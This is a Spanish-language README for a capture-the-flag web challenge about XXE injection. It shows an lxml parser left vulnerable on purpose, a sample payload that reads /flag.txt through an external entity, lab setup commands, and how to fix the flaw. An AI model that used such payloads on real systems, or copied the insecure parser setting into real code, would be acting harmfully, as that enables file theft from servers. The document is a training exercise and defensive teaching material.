# InvoicePro Corp — XXE Injection

Dificultad: Hard | Categoría: Web | Técnica: XML External Entity (XXE)

## Descripción

InvoicePro Corp ofrece un sistema de procesamiento de facturas en XML. El servidor acepta documentos XML del usuario y extrae los campos para mostrarlos en pantalla.

El problema: el parser XML está configurado con `resolve_entities=True`, lo que permite definir **entidades externas** que referencian archivos del sistema de archivos del servidor.

## Vulnerabilidad

**XML External Entity (XXE) Injection** es una vulnerabilidad que ocurre cuando un parser XML procesa entidades externas definidas por el usuario. Estas entidades pueden leer archivos locales, hacer peticiones HTTP internas (SSRF) o incluso ejecutar comandos en configuraciones especiales.

En este reto, la librería `lxml` de Python está configurada de forma insegura:

```python
parser = etree.XMLParser(resolve_entities=True, no_network=False)
```

## Objetivo

Leer el contenido de `/flag.txt` enviando un payload XXE.

## Payload de ejemplo

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<invoice>
  <id>&xxe;</id>
  <amount>1.00</amount>
</invoice>
```

El parser sustituye `&xxe;` por el contenido del archivo antes de extraer el texto de cada elemento.

## Levantar el entorno

```bash
docker compose up --build
# Disponible en http://localhost:8080
```

## Ejecutar el solver

```bash
pip install requests
python3 solve.py
```

## Mitigación

Configurar el parser para rechazar entidades externas:

```python
parser = etree.XMLParser(resolve_entities=False, no_network=True)
```

O usar `defusedxml` como alternativa segura por defecto.
